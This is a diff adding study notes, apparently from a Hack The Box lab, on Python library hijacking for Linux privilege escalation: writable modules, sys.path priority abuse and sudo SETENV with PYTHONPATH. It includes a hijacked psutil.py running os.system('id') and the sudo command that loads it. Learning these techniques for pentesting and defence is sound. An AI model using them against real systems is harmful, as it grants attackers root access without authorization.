@@ -771,3 +771,106 @@ void dbquery() {
 ```shell
 $ gcc src.c -fPIC -shared -o /development/libshared.so
 ```
+## Python Library Hijacking
+
+**here are three basic vulnerabilities where hijacking can be used:**
+- Wrong write permissions
+- Library Path
+- PYTHONPATH environment variable
+
+### Wrong write permissions
+
+```shell
+# check script have setuid 
+$ ls -l mem_status.py
+
+-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
+
+```
+Python Script - Contents
+```python
+!/usr/bin/env python3
+import psutil
+
+available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
+
+print(f"Available memory: {round(available_memory, 2)}%")
+```
+Module Permissions
+```shell
+$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
+
+/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
+/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
+/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
+/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
+/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
+/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
+/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
+
+
+$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
+
+-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
+```
+
+change the module by edtiting virtual_memory function 
+
+### Library Path
+
+**To be able to use this variant, two prerequisites are necessary:**
+- We must have write permissions to one of the paths having a higher priority on the list.
+- The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable.
+
+
+
+paths higher on the list take priority over ones lower on the list.
+```shell
+$ python3 -c 'import sys; print("\n".join(sys.path))'
+
+/usr/lib/python38.zip
+/usr/lib/python3.8
+/usr/lib/python3.8/lib-dynload
+/usr/local/lib/python3.8/dist-packages
+/usr/lib/python3/dist-packages
+
+$ pip3 show psutil
+
+Location: /usr/local/lib/python3.8/dist-packages
+```
+Misconfigured Directory Permissions
+```shell
+$ ls -la /usr/lib/python3.8
+
+total 4916
+drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
+```
+
+cretae Hijacked Module Contents in psutil.py in /usr/lib/python3.8
+```
+#!/usr/bin/env python3
+
+import os
+
+def virtual_memory():
+    os.system('id')
+
+```
+
+### PYTHONPATH Environment Variable
+
+we are allowed to run /usr/bin/python3 under the trusted permissions of sudo and are therefore allowed to set environment variables for use with this binary by the `SETENV`
+```shell
+sudo -l 
+
+Matching Defaults entries for htb-student on ACADEMY-LPENIX:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User htb-student may run the following commands on ACADEMY-LPENIX:
+    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
+```
+
+create a malcious script int `/tmp` and run
+```shell
+$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
+```
